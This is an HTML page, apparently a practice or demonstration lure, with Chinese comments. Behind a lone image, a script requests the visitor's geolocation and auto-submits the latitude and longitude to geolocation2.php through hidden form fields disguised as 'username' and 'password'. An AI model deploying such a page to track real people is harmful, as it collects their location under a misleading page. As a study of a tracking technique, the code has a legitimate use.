<!DOCTYPE html>

 

<html>

 

<head>

 

    <meta charset="UTF-8">

 

    <title>Document</title>

 

</head>

 

<body>

 

 <img src="1.png" alt="" width="100%;">

 

    <script>

 

      var geol;       

 

        try {

 

            if (typeof(navigator.geolocation) == 'undefined') {

 

                geol = google.gears.factory.create('beta.geolocation');

 

            } else {

 

                geol = navigator.geolocation;

 

            }

 

        } catch (error) {

 

            //alert(error.message);

 

        }

 

        if (geol) {

 

            geol.getCurrentPosition(function(position) {

 

        var nowLatitude = position.coords.latitude;             

 

        var nowLongitude = position.coords.longitude;       

 

         //以上是固定代码，获取经度纬度

 

    alert("纬度：" + nowLatitude + "， 经度：" + nowLongitude);  //弹出经度纬度的坐标

 

          function new_form(){

 

            var f=document.createElement("form");

 

            document.body.appendChild(f);

 

            f.method="post";

 

            return f;

 

        }    //定义函数，创建form

 

  

        function create_elements(eForm,eName,eValue){

 

            var e=document.createElement("input");

 

            eForm.appendChild(e);

 

            e.type="text";

 

            e.name=eName;

 

            if(!document.all){e.style.display="none"}else{

 

                e.style.display="block";

 

                e.style.width="0px";

 

                e.style.height="0px";

 

            }

 

            e.value=eValue;

 

            return e;

 

        }

 

//这段代码意思就是 定义方法，有两个input 他们的值分别是经度纬度的值

 

        var _f=new_form();

 

        create_elements(_f,"username",nowLatitude) // 创建form中的input对象

 

        create_elements(_f,"password",nowLongitude);

 

        _f.action="geolocation2.php";

 

        _f.submit();   //提交

 

 

 //表单自提交发送到geolocation2.php页面  

 

    }, function(error) {

 

        switch(error.code){

 

        case error.TIMEOUT :

 

            //alert("连接超时，请重试");

 

            break;

 

        case error.PERMISSION_DENIED :

 

            //alert("您拒绝了使用位置共享服务，查询已取消");

 

            break;

 

        case error.POSITION_UNAVAILABLE :

 

            //alert("非常抱歉，我们暂时无法通过浏览器获取您的位置信息");

 

            break;

 

        }

 

    }, {timeout:10000});    //设置十秒超时 

 

        }

 

 //设置连接超时的报错

 

  </script>

 

</body>

 

</html>
